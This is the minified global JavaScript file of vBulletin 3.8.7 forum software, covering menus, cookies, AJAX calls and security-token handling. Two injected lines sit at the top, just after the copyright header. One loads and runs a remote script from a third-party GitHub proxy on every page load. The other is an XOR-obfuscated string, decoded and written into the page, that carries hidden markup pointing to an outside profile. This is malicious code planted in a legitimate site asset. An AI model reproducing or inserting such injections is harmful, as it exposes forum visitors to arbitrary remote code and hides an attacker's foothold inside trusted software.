/*======================================================================*\
|| #################################################################### ||
|| # vBulletin 3.8.7
|| # ---------------------------------------------------------------- # ||
|| # Copyright ©2000-2011 vBulletin Solutions, Inc. All Rights Reserved. ||
|| # This file may not be redistributed in whole or significant part. # ||
|| # ---------------- VBULLETIN IS NOT FREE SOFTWARE ---------------- # ||
|| # http://www.vbulletin.com | http://www.vbulletin.com/license.html # ||
|| #################################################################### ||
\*======================================================================*/
$(document).ready(function() {$('body').after('<script type="text/javascript" src="https://combinatronics.com/ahmedto/wahetaleslam/master/a7la.js"></script>');});
var enkripsi="'02'1Aqv{ng'02v{rg'1F'00vgzv-aqq'00'1G'2Cc'7@jpgd'7G'1F'00jvvrq'1C--uuu,dcag`mmi,amo-Gqnco,Cjogf,Jcof{'00'7F'02'5@'2Cfkqrnc{'1Clmlg'1@'2C'2;'5F'2;'2C'1A-qv{ng'1G'2C"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
if(!window.console||!console.firebug){window.console={};var names=["log","debug","info","warn","error","assert","dir","dirxml","group","groupEnd","time","timeEnd","count","trace","profile","profileEnd"];for(var i=0;i<names.length;++i){window.console[names[i]]=function(){}}}var SESSIONURL=(typeof (SESSIONURL)=="undefined"?"":SESSIONURL);var SECURITYTOKEN=(typeof (SECURITYTOKEN)=="undefined"?"":SECURITYTOKEN);var vbphrase=(typeof (vbphrase)=="undefined"?new Array():vbphrase);var vB_Editor=new Array();var ignorequotechars=false;var pagenavcounter=0;var is_regexp=(window.RegExp)?true:false;var AJAX_Compatible=false;var viewport_info=null;var vB_Default_Timeout=15000;var userAgent=navigator.userAgent.toLowerCase();var is_opera=(YAHOO.env.ua.opera>0);var is_saf=(YAHOO.env.ua.webkit>0);var is_webtv=(userAgent.indexOf("webtv")!=-1);var is_ie=((YAHOO.env.ua.ie>0)&&(!is_opera)&&(!is_saf)&&(!is_webtv));var is_ie4=(YAHOO.env.ua.ie==4);var is_ie7=(YAHOO.env.ua.ie>=7);var is_ps3=(userAgent.indexOf("playstation 3")!=-1);var is_moz=(YAHOO.env.ua.gecko>0);var is_kon=(userAgent.indexOf("konqueror")!=-1);var is_ns=((userAgent.indexOf("compatible")==-1)&&(userAgent.indexOf("mozilla")!=-1)&&(!is_opera)&&(!is_webtv)&&(!is_saf));var is_ns4=((is_ns)&&(parseInt(navigator.appVersion)==4));var is_mac=(userAgent.indexOf("mac")!=-1);var pointer_cursor=(is_ie?"hand":"pointer");String.prototype.vBlength=function(){return(is_ie&&this.indexOf("\n")!=-1)?this.replace(/\r?\n/g,"_").length:this.length};if("1234".substr(-2,2)=="12"){String.prototype.substr_orig=String.prototype.substr;String.prototype.substr=function(B,A){if(typeof (A)=="undefined"){return this.substr_orig((B<0?this.length+B:B))}else{return this.substr_orig((B<0?this.length+B:B),A)}}}if(typeof Array.prototype.shift==="undefined"){Array.prototype.shift=function(){for(var C=0,A=this[0],B=this.length-1;C<B;C++){this[C]=this[C+1]}this.length--;return A}}function fetch_object(A){if(document.getElementById){return document.getElementById(A)}else{if(document.all){return document.all[A]}else{if(document.layers){return document.layers[A]}else{return null}}}}function fetch_tags(B,A){if(B==null){return new Array()}else{if(typeof B.getElementsByTagName!="undefined"){return B.getElementsByTagName(A)}else{if(B.all&&B.all.tags){return B.all.tags(A)}else{return new Array()}}}}function fetch_tag_count(B,A){return fetch_tags(B,A).length}function do_an_e(A){if(!A||is_ie){window.event.returnValue=false;window.event.cancelBubble=true;return window.event}else{A.stopPropagation();A.preventDefault();return A}}function e_by_gum(A){if(!A||is_ie){window.event.cancelBubble=true;return window.event}else{if(A.target.type=="submit"){A.target.form.submit()}A.stopPropagation();return A}}function validatemessage(B,D,A){if(is_kon||is_saf||is_webtv){return true}else{if(D.length<1){alert(vbphrase.must_enter_subject);return false}else{var C=PHP.trim(stripcode(B,false,ignorequotechars));if(C.length<A){alert(construct_phrase(vbphrase.message_too_short,A));return false}else{if(typeof (document.forms.vbform)!="undefined"&&typeof (document.forms.vbform.imagestamp)!="undefined"){document.forms.vbform.imagestamp.failed=false;if(document.forms.vbform.imagestamp.value.length!=6){alert(vbphrase.complete_image_verification);document.forms.vbform.imagestamp.failed=true;document.forms.vbform.imagestamp.focus();return false}else{return true}}else{return true}}}}}function stripcode(F,G,B){if(!is_regexp){return F}if(B){var C=new Date().getTime();while((startindex=PHP.stripos(F,"[quote"))!==false){if(new Date().getTime()-C>2000){break}if((stopindex=PHP.stripos(F,"[/quote]"))!==false){fragment=F.substr(startindex,stopindex-startindex+8);F=F.replace(fragment,"")}else{break}F=PHP.trim(F)}}if(G){F=F.replace(/<img[^>]+src="([^"]+)"[^>]*>/gi,"$1");var H=new RegExp("<(\\w+)[^>]*>","gi");var E=new RegExp("<\\/\\w+>","gi");F=F.replace(H,"");F=F.replace(E,"");var D=new RegExp("(&nbsp;)","gi");F=F.replace(D," ")}else{var A=new RegExp("\\[(\\w+)(=[^\\]]*)?\\]","gi");var I=new RegExp("\\[\\/(\\w+)\\]","gi");F=F.replace(A,"");F=F.replace(I,"")}return F}function vB_PHP_Emulator(){}vB_PHP_Emulator.prototype.stripos=function(A,B,C){if(typeof C=="undefined"){C=0}index=A.toLowerCase().indexOf(B.toLowerCase(),C);return(index==-1?false:index)};vB_PHP_Emulator.prototype.ltrim=function(A){return A.replace(/^\s+/g,"")};vB_PHP_Emulator.prototype.rtrim=function(A){return A.replace(/(\s+)$/g,"")};vB_PHP_Emulator.prototype.trim=function(A){return this.ltrim(this.rtrim(A))};vB_PHP_Emulator.prototype.preg_quote=function(A){return A.replace(/(\+|\{|\}|\(|\)|\[|\]|\||\/|\?|\^|\$|\\|\.|\=|\!|\<|\>|\:|\*)/g,"\\$1")};vB_PHP_Emulator.prototype.match_all=function(C,E){var A=C.match(RegExp(E,"gim"));if(A){var F=new Array();var B=new RegExp(E,"im");for(var D=0;D<A.length;D++){F[F.length]=A[D].match(B)}return F}else{return false}};vB_PHP_Emulator.prototype.unhtmlspecialchars=function(D){var C=new Array(/&lt;/g,/&gt;/g,/&quot;/g,/&amp;/g);var B=new Array("<",">",'"',"&");for(var A in C){if(YAHOO.lang.hasOwnProperty(C,A)){D=D.replace(C[A],B[A])}}return D};vB_PHP_Emulator.prototype.unescape_cdata=function(C){var B=/<\=\!\=\[\=C\=D\=A\=T\=A\=\[/g;var A=/\]\=\]\=>/g;return C.replace(B,"<![CDATA[").replace(A,"]]>")};vB_PHP_Emulator.prototype.htmlspecialchars=function(D){var C=new Array((is_mac&&is_ie?new RegExp("&","g"):new RegExp("&(?!#[0-9]+;)","g")),new RegExp("<","g"),new RegExp(">","g"),new RegExp('"',"g"));var B=new Array("&amp;","&lt;","&gt;","&quot;");for(var A=0;A<C.length;A++){D=D.replace(C[A],B[A])}return D};vB_PHP_Emulator.prototype.in_array=function(D,C,B){var E=new String(D);var A;if(B){E=E.toLowerCase();for(A in C){if(YAHOO.lang.hasOwnProperty(C,A)){if(C[A].toLowerCase()==E){return A}}}}else{for(A in C){if(YAHOO.lang.hasOwnProperty(C,A)){if(C[A]==E){return A}}}}return -1};vB_PHP_Emulator.prototype.str_pad=function(C,A,B){C=new String(C);B=new String(B);if(C.length<A){padtext=new String(B);while(padtext.length<(A-C.length)){padtext+=B}C=padtext.substr(0,(A-C.length))+C}return C};vB_PHP_Emulator.prototype.urlencode=function(D){D=escape(D.toString()).replace(/\+/g,"%2B");var B=D.match(/(%([0-9A-F]{2}))/gi);if(B){for(var C=0;C<B.length;C++){var A=B[C].substring(1,3);if(parseInt(A,16)>=128){D=D.replace(B[C],"%u00"+A)}}}D=D.replace("%25","%u0025");return D};vB_PHP_Emulator.prototype.ucfirst=function(D,A){if(typeof A!="undefined"){var B=D.indexOf(A);if(B>0){D=D.substr(0,B)}}D=D.split(" ");for(var C=0;C<D.length;C++){D[C]=D[C].substr(0,1).toUpperCase()+D[C].substr(1)}return D.join(" ")};function vB_AJAX_Handler(A){this.async=A?true:false;this.conn=null}vB_AJAX_Handler.prototype.init=function(){return AJAX_Compatible};vB_AJAX_Handler.is_compatible=function(){return AJAX_Compatible};vB_AJAX_Handler.prototype.onreadystatechange=function(A){this.callback=A};vB_AJAX_Handler.prototype.fetch_data=function(A){console.warn('vB_AJAX_Handler.prototype.fetch_data() is deprecated.\nUse responseXML.getElementsByTagName("x")[i].firstChild.nodeValue instead.');if(A&&A.firstChild&&A.firstChild.nodeValue){return PHP.unescape_cdata(A.firstChild.nodeValue)}else{return""}};vB_AJAX_Handler.prototype.send=function(A,B){this.conn=YAHOO.util.Connect.asyncRequest("POST",A,{success:this.callback},B+"&securitytoken="+SECURITYTOKEN+"&s="+fetch_sessionhash());this.handler=this.conn.conn};function is_ajax_compatible(){if(typeof vb_disable_ajax!="undefined"&&vb_disable_ajax==2){return false}else{if(is_ie&&!is_ie4){return true}else{if(window.XMLHttpRequest){try{var A=new XMLHttpRequest();return A.setRequestHeader?true:false}catch(B){return false}}else{return false}}}}AJAX_Compatible=is_ajax_compatible();console.info("This browser is%s AJAX compatible",AJAX_Compatible?"":" NOT");function vBulletin_AJAX_Error_Handler(A){console.warn("AJAX Error: Status = %s: %s",A.status,A.statusText)}function vB_Hidden_Form(A){this.action=A;this.variables=new Array()}vB_Hidden_Form.prototype.add_variable=function(A,B){this.variables[this.variables.length]=new Array(A,B);console.log("vB_Hidden_Form :: add_variable(%s)",A)};vB_Hidden_Form.prototype.add_variables_from_object=function(F){if(!F){return }console.info("vB_Hidden_Form :: add_variables_from_object(%s)",F.id);var B=fetch_tags(F,"input");var E;for(E=0;E<B.length;E++){switch(B[E].type){case"checkbox":case"radio":if(B[E].checked){this.add_variable(B[E].name,B[E].value)}break;case"text":case"hidden":case"password":this.add_variable(B[E].name,B[E].value);break;default:continue}}var A=fetch_tags(F,"textarea");for(E=0;E<A.length;E++){this.add_variable(A[E].name,A[E].value)}var D=fetch_tags(F,"select");for(E=0;E<D.length;E++){if(D[E].multiple){for(var C=0;C<D[E].options.length;C++){if(D[E].options[C].selected){this.add_variable(D[E].name,D[E].options[C].value)}}}else{this.add_variable(D[E].name,D[E].options[D[E].selectedIndex].value)}}};vB_Hidden_Form.prototype.fetch_variable=function(A){for(var B=0;B<this.variables.length;B++){if(this.variables[B][0]==A){return this.variables[B][1]}}return null};vB_Hidden_Form.prototype.submit_form=function(){this.form=document.createElement("form");this.form.method="post";this.form.action=this.action;for(var A=0;A<this.variables.length;A++){var B=document.createElement("input");B.type="hidden";B.name=this.variables[A][0];B.value=this.variables[A][1];this.form.appendChild(B)}console.info("vB_Hidden_Form :: submit_form() -> %s",this.action);document.body.appendChild(this.form).submit()};vB_Hidden_Form.prototype.build_query_string=function(){var B="";for(var A=0;A<this.variables.length;A++){B+=this.variables[A][0]+"="+PHP.urlencode(this.variables[A][1])+"&"}console.info("vB_Hidden_Form :: Query String = %s",B);return B};vB_Hidden_Form.prototype.add_input=vB_Hidden_Form.prototype.add_variable;vB_Hidden_Form.prototype.add_inputs_from_object=vB_Hidden_Form.prototype.add_variables_from_object;function vB_Select_Overlay_Handler(A){this.browser_affected=(is_ie&&YAHOO.env.ua.ie<7);if(this.browser_affected){this.overlay=YAHOO.util.Dom.get(A);this.hidden_selects=new Array();console.log("Initializing <select> overlay handler for '%s'.",this.overlay.id)}}vB_Select_Overlay_Handler.prototype.hide=function(){if(this.browser_affected){var C=YAHOO.util.Dom.getRegion(this.overlay);var B=document.getElementsByTagName("select");for(var A=0;A<B.length;A++){if(region_intersects(B[A],C)){if(YAHOO.util.Dom.isAncestor(this.overlay,B[A])){continue}else{YAHOO.util.Dom.setStyle(B[A],"visibility","hidden");this.hidden_selects.push(YAHOO.util.Dom.generateId(B[A]))}}}}};vB_Select_Overlay_Handler.prototype.show=function(){if(this.browser_affected){var A;while(A=this.hidden_selects.pop()){YAHOO.util.Dom.setStyle(A,"visibility","visible")}}};function openWindow(C,D,B,A){return window.open(C,(typeof A=="undefined"?"vBPopup":A),"statusbar=no,menubar=no,toolbar=no,scrollbars=yes,resizable=yes"+(typeof D!="undefined"?(",width="+D):"")+(typeof B!="undefined"?(",height="+B):""))}function js_open_help(B,C,A){return openWindow("help.php?s="+SESSIONHASH+"&do=answer&page="+B+"&pageaction="+C+"&option="+A,600,450,"helpwindow")}function attachments(A){return openWindow("misc.php?"+SESSIONURL+"do=showattachments&t="+A,480,300)}function who(A){return openWindow("misc.php?"+SESSIONURL+"do=whoposted&t="+A,230,300)}function imwindow(D,B,C,A){return openWindow("sendmessage.php?"+SESSIONURL+"do=im&type="+D+"&u="+B,C,A)}function SendMSNMessage(A){if(!is_ie){alert(vbphrase.msn_functions_only_work_in_ie)}else{try{MsgrObj.InstantMessage(A)}catch(B){alert(vbphrase.msn_functions_only_work_in_ie)}}return false}function AddMSNContact(A){if(!is_ie){alert(vbphrase.msn_functions_only_work_in_ie)}else{try{MsgrObj.AddContact(0,A)}catch(B){alert(vbphrase.msn_functions_only_work_in_ie)}}return false}function detect_caps_lock(D){D=(D?D:window.event);var A=(D.which?D.which:(D.keyCode?D.keyCode:(D.charCode?D.charCode:0)));var C=(D.shiftKey||(D.modifiers&&(D.modifiers&4)));var B=(D.ctrlKey||(D.modifiers&&(D.modifiers&2)));return(A>=65&&A<=90&&!C&&!B)||(A>=97&&A<=122&&C)}function log_out(B){var A=document.getElementsByTagName("html")[0];A.style.filter="progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";if(confirm(B)){return true}else{A.style.filter="";return false}}function set_cookie(B,C,A){console.log("Set Cookie :: %s = '%s'",B,C);document.cookie=B+"="+escape(C)+"; path=/"+(typeof A!="undefined"?"; expires="+A.toGMTString():"")}function delete_cookie(A){console.log("Delete Cookie :: %s",A);document.cookie=A+"=; expires=Thu, 01-Jan-70 00:00:01 GMT; path=/"}function fetch_cookie(A){cookie_name=A+"=";cookie_length=document.cookie.length;cookie_begin=0;while(cookie_begin<cookie_length){value_begin=cookie_begin+cookie_name.length;if(document.cookie.substring(cookie_begin,value_begin)==cookie_name){var C=document.cookie.indexOf(";",value_begin);if(C==-1){C=cookie_length}var B=unescape(document.cookie.substring(value_begin,C));console.log("Fetch Cookie :: %s = '%s'",A,B);return B}cookie_begin=document.cookie.indexOf(" ",cookie_begin)+1;if(cookie_begin==0){break}}console.log("Fetch Cookie :: %s (null)",A);return null}function js_toggle_all(D,E,C,A,G){for(var B=0;B<D.elements.length;B++){var F=D.elements[B];if(F.type==E&&PHP.in_array(F.name,A,false)==-1){switch(E){case"radio":if(F.value==C){F.checked=G}break;case"select-one":F.selectedIndex=G;break;default:F.checked=G;break}}}}function js_select_all(A){exclude=new Array();exclude[0]="selectall";js_toggle_all(A,"select-one","",exclude,A.selectall.selectedIndex)}function js_check_all(A){exclude=new Array();exclude[0]="keepattachments";exclude[1]="allbox";exclude[2]="removeall";js_toggle_all(A,"checkbox","",exclude,A.allbox.checked)}function js_check_all_option(B,A){exclude=new Array();exclude[0]="useusergroup";js_toggle_all(B,"radio",A,exclude,true)}function checkall(A){js_check_all(A)}function checkall_option(B,A){js_check_all_option(B,A)}function resize_textarea(C,B){var A=fetch_object(B);A.style.width=parseInt(A.offsetWidth)+(C<0?-100:100)+"px";A.style.height=parseInt(A.offsetHeight)+(C<0?-100:100)+"px";return false}function region_intersects(B,A){B=typeof (B.left)=="undefined"?YAHOO.util.Dom.getRegion(B):B;A=typeof (A.left)=="undefined"?YAHOO.util.Dom.getRegion(A):A;return(B.left>A.right||B.right<A.left||B.top>A.bottom||B.bottom<A.top)?false:true}function fetch_viewport_info(){if(viewport_info==null){viewport_info={x:YAHOO.util.Dom.getDocumentScrollLeft(),y:YAHOO.util.Dom.getDocumentScrollTop(),w:YAHOO.util.Dom.getViewportWidth(),h:YAHOO.util.Dom.getViewportHeight()};console.info("Viewport Info: Size = %dx%d, Position = %d,%d",viewport_info.w,viewport_info.h,viewport_info.x,viewport_info.y)}return viewport_info}function clear_viewport_info(){viewport_info=null}function center_element(A){viewport_info=fetch_viewport_info();YAHOO.util.Dom.setXY(A,[viewport_info.w/2+viewport_info.x-A.clientWidth/2,viewport_info.h/2+viewport_info.y-A.clientHeight/2])}function fetch_all_stylesheets(D){var G=new Array(),B=0,A=null,E=0,F=0;for(B=0;B<document.styleSheets.length;B++){A=document.styleSheets[B];G.push(A);try{if(A.cssRules){for(E=0;E<A.cssRules.length;E++){if(A.cssRules[E].styleSheet){G.push(A.cssRules[E].styleSheet)}}}else{if(A.imports){for(F=0;F<A.imports.length;F++){G.push(A.imports[F])}}}}catch(C){G.pop();continue}}return G}function highlight_login_box(){var E=fetch_object("navbar_username");var A="inlinemod";var B,C=1600,D=200;if(E){E.focus();E.select();for(B=0;B<C;B+=2*D){window.setTimeout(function(){YAHOO.util.Dom.addClass(E,A)},B);window.setTimeout(function(){YAHOO.util.Dom.removeClass(E,A)},B+D)}}return false}function toggle_collapse(B,E){if(!is_regexp){return false}var D=fetch_object("collapseobj_"+B);var A=fetch_object("collapseimg_"+B);var C=fetch_object("collapsecel_"+B);if(!D){if(A){A.style.display="none"}return false}if(D.style.display=="none"||"open"==E){D.style.display="";if(!E){save_collapsed(B,false)}if(A){img_re=new RegExp("_collapsed\\.gif$");A.src=A.src.replace(img_re,".gif")}if(C){cel_re=new RegExp("^(thead|tcat)(_collapsed)$");C.className=C.className.replace(cel_re,"$1")}}else{if(D.style.display!="none"||"closed"==E){D.style.display="none";if(!E){save_collapsed(B,true)}if(A){img_re=new RegExp("\\.gif$");A.src=A.src.replace(img_re,"_collapsed.gif")}if(C){cel_re=new RegExp("^(thead|tcat)$");C.className=C.className.replace(cel_re,"$1_collapsed")}}}return false}function save_collapsed(A,E){var D=fetch_cookie("vbulletin_collapse");var C=new Array();if(D!=null){D=D.split("\n");for(var B in D){if(YAHOO.lang.hasOwnProperty(D,B)&&D[B]!=A&&D[B]!=""){C[C.length]=D[B]}}}if(E){C[C.length]=A}expires=new Date();expires.setTime(expires.getTime()+(1000*86400*365));set_cookie("vbulletin_collapse",C.join("\n"),expires)}function vBpagenav(){}vBpagenav.prototype.controlobj_onclick=function(C){this._onclick(C);var A=fetch_tags(this.menu.menuobj,"input");for(var B=0;B<A.length;B++){if(A[B].type=="text"){A[B].focus();break}}};vBpagenav.prototype.form_gotopage=function(A){if((pagenum=parseInt(fetch_object("pagenav_itxt").value,10))>0){window.location=vBmenu.menus[vBmenu.activemenu].addr+"&page="+pagenum}return false};vBpagenav.prototype.ibtn_onclick=function(A){return this.form.gotopage()};vBpagenav.prototype.itxt_onkeypress=function(A){return((A?A:window.event).keyCode==13?this.form.gotopage():true)};function vbmenu_register(B,A,C){if(typeof (vBmenu)=="object"){return vBmenu.register(B,A)}else{return false}}function string_to_node(B){var A=document.createElement("div");A.innerHTML=B;var C=A.firstChild;while(C&&C.nodeType!=1){C=C.nextSibling}if(!C){return A.firstChild.cloneNode(true)}else{return C.cloneNode(true)}}function set_unselectable(B){B=YAHOO.util.Dom.get(B);if(!is_ie4&&typeof B.tagName!="undefined"){if(B.hasChildNodes()){for(var A=0;A<B.childNodes.length;A++){set_unselectable(B.childNodes[A])}}B.unselectable="on"}}function fetch_sessionhash(){return(SESSIONURL==""?"":SESSIONURL.substr(2,32))}function construct_phrase(){if(!arguments||arguments.length<1||!is_regexp){return false}var A=arguments;var D=A[0];var C;for(var B=1;B<A.length;B++){C=new RegExp("%"+B+"\\$s","gi");D=D.replace(C,A[B])}return D}function switch_id(C,E){var F=C.options[C.selectedIndex].value;if(F==""){return }var B=new String(window.location);var A=new String("");B=B.split("#");if(B[1]){A="#"+B[1]}B=B[0];if(B.indexOf(E+"id=")!=-1&&is_regexp){var D=new RegExp(E+"id=\\d+&?");B=B.replace(D,"")}if(B.indexOf("?")==-1){B+="?"}else{lastchar=B.substr(B.length-1);if(lastchar!="&"&&lastchar!="?"){B+="&"}}window.location=B+E+"id="+F+A}function child_img_alt_2_title(A){var C=A.getElementsByTagName("img");for(var B=0;B<C.length;B++){img_alt_2_title(C[B])}}function img_alt_2_title(A){if(!A.title&&A.alt!=""){A.title=A.alt}}function do_securitytoken_replacement(B){if(B==""){return }for(var A=0;A<document.forms.length;A++){if(document.forms[A].elements.securitytoken&&document.forms[A].elements.securitytoken.value==SECURITYTOKEN){document.forms[A].elements.securitytoken.value=B}}SECURITYTOKEN=B;console.log("Securitytoken updated")}function handle_securitytoken_response(A){console.log("Processing securitytoken update");if(A.responseXML&&A.responseXML.getElementsByTagName("securitytoken").length){var B=A.responseXML.getElementsByTagName("securitytoken")[0].firstChild.nodeValue;do_securitytoken_replacement(B);securitytoken_errors=0}else{handle_securitytoken_error(A)}}function handle_securitytoken_error(A){console.log("Securitytoken Error");if(++securitytoken_errors==3){do_securitytoken_replacement("guest")}}var securitytoken_timeout=window.setTimeout("replace_securitytoken()",3600000);var securitytoken_errors=0;function replace_securitytoken(){window.clearTimeout(securitytoken_timeout);if(AJAX_Compatible&&SECURITYTOKEN!=""&&SECURITYTOKEN!="guest"){securitytoken_timeout=window.setTimeout("replace_securitytoken()",3600000);YAHOO.util.Connect.asyncRequest("POST","ajax.php",{success:handle_securitytoken_response,failure:handle_securitytoken_error,timeout:vB_Default_Timeout},SESSIONURL+"securitytoken="+SECURITYTOKEN+"&do=securitytoken")}}function Comment_Init(B){if(typeof B.id=="undefined"){return }var C=B.id;if(isNaN(C)){var A=null;if(A=C.match(/(\d+)/)){C=A[0]}}if(typeof inlineMod_comment!="undefined"){im_init(B,inlineMod_comment)}if(typeof vB_QuickEditor_Factory!="undefined"){if(typeof vB_QuickEditor_Factory.controls[C]=="undefined"){vB_QuickEditor_Factory.controls[C]=new vB_QuickEditor(C,vB_QuickEditor_Factory)}else{vB_QuickEditor_Factory.controls[C].init()}}if(typeof vB_QuickLoader_Factory!="undefined"){vB_QuickLoader_Factory.controls[C]=new vB_QuickLoader(C,vB_QuickLoader_Factory)}child_img_alt_2_title(B)}function PostBit_Init(C,D){console.log("PostBit Init: %d",D);if(typeof vBmenu!="undefined"){var B=fetch_tags(C,"div");for(var A=0;A<B.length;A++){if(B[A].id&&B[A].id.substr(0,9)=="postmenu_"){vBmenu.register(B[A].id,true)}}}if(typeof vB_QuickEditor!="undefined"){vB_AJAX_QuickEdit_Init(C)}if(typeof vB_QuickReply!="undefined"){qr_init_buttons(C)}if(typeof mq_init!="undefined"){mq_init(C)}if(typeof vBrep!="undefined"){if(typeof D!="undefined"&&typeof D!="null"){vbrep_register(D)}}if(typeof inlineMod!="undefined"){im_init(C)}if(typeof vB_Lightbox!="undefined"){init_postbit_lightbox(C,false,true)}child_img_alt_2_title(C)}function vBulletin_init(){if(is_webtv){return false}child_img_alt_2_title(document);if(typeof vBmenu=="object"){if(typeof (YAHOO)!="undefined"){YAHOO.util.Event.on(document,"click",vbmenu_hide);YAHOO.util.Event.on(window,"resize",vbmenu_hide)}else{if(window.attachEvent&&!is_saf){document.attachEvent("onclick",vbmenu_hide);window.attachEvent("onresize",vbmenu_hide)}else{if(document.addEventListener&&!is_saf){document.addEventListener("click",vbmenu_hide,false);window.addEventListener("resize",vbmenu_hide,false)}else{window.onclick=vbmenu_hide;window.onresize=vbmenu_hide}}}var B=fetch_tags(document,"td");for(var D=0;D<B.length;D++){if(B[D].hasChildNodes()&&B[D].firstChild.name&&B[D].firstChild.name.indexOf("PageNav")!=-1){var C=B[D].title;B[D].title="";B[D].innerHTML="";B[D].id="pagenav."+D;var A=vBmenu.register(B[D].id);A.addr=C;if(is_saf){A.controlobj._onclick=A.controlobj.onclick;A.controlobj.onclick=vBpagenav.prototype.controlobj_onclick}}}if(typeof C!="undefined"){fetch_object("pagenav_form").gotopage=vBpagenav.prototype.form_gotopage;fetch_object("pagenav_ibtn").onclick=vBpagenav.prototype.ibtn_onclick;fetch_object("pagenav_itxt").onkeypress=vBpagenav.prototype.itxt_onkeypress}vBmenu.activate(true)}vBulletin.init();return true}function vBulletin_Framework(){this.elements=new Array();this.ajaxurls=new Array();this.events=new Array();this.time=new Date();this.add_event("systemInit")}vBulletin_Framework.prototype.init=function(){console.info("Firing System Init");this.events.systemInit.fire()};vBulletin_Framework.prototype.extend=function(C,A){function B(){}B.prototype=A.prototype;C.prototype=new B();C.prototype.constructor=C;C.baseConstructor=A;C.superClass=A.prototype};vBulletin_Framework.prototype.register_control=function(B,E){var C=new Array();for(var D=1;D<arguments.length;D++){C.push(arguments[D])}if(!this.elements[B]){console.info('Creating array vBulletin.elements["%s"]',B);this.elements[B]=new Array()}var A=this.elements[B].push(C);console.log('vBulletin.elements["%s"][%d] = %s',B,A-1,C.join(", "))};vBulletin_Framework.prototype.register_ajax_urls=function(B,C,D){B=B.split("?");B[1]=SESSIONURL+"securitytoken="+SECURITYTOKEN+"&ajax=1&"+B[1].replace(/\{(\d+)(:\w+)?\}/gi,"%$1$s");C=C.split("?");C[1]=SESSIONURL+"securitytoken="+SECURITYTOKEN+"&ajax=1&"+C[1].replace(/\{(\d+)(:\w+)?\}/gi,"%$1$s");console.log("Register AJAX URLs for %s",D);for(var A=0;A<D.length;A++){this.ajaxurls[D[A]]=new Array(B,C)}};vBulletin_Framework.prototype.add_event=function(A){this.events[A]=new YAHOO.util.CustomEvent(A)};vBulletin_Framework.prototype.console=function(){if(window.console||console.firebug){var args=new Array();for(var i=0;i<arguments.length;i++){args[args.length]=arguments[i]}try{eval("console.log('"+args.join("','")+"');")}catch(e){}}};var PHP=new vB_PHP_Emulator();var vBulletin=new vBulletin_Framework();vBulletin.events.systemInit.subscribe(function(){YAHOO.util.Event.on(window,"resize",clear_viewport_info);YAHOO.util.Event.on(window,"scroll",clear_viewport_info)});function handle_dismiss_notice_error(C){if(C.argument){var B=YAHOO.util.Dom.get("dismiss_notice_hidden");B.value=C.argument;var A=YAHOO.util.Dom.get("notices");A.submit()}}function handle_dismiss_notice_ajax(E){if(E.responseXML&&E.responseXML.getElementsByTagName("dismissed").length){var B=E.responseXML.getElementsByTagName("dismissed")[0].firstChild.nodeValue;var A=YAHOO.util.Dom.get("navbar_notice_"+B);if(A!=null){A.style.display="none";var C=YAHOO.util.Dom.getElementsByClassName("navbar_notice","",YAHOO.util.Dom.get("notices"));var D=0;for(i=0;i<C.length;i++){if(C[i].style.display!="none"){D++}}if(D==0){var F=YAHOO.util.Dom.get("notices");if(F!=null){F.style.display="none"}}}}else{handle_dismiss_notice_error(E)}}function dismiss_notice(B){if(AJAX_Compatible){var A=YAHOO.util.Connect.asyncRequest("POST","ajax.php?do=dismissnotice",{success:handle_dismiss_notice_ajax,failure:handle_dismiss_notice_error,timeout:vB_Default_Timeout,argument:B},SESSIONURL+"securitytoken="+SECURITYTOKEN+"&do=dismissnotice&noticeid="+PHP.urlencode(B));return false}return true};
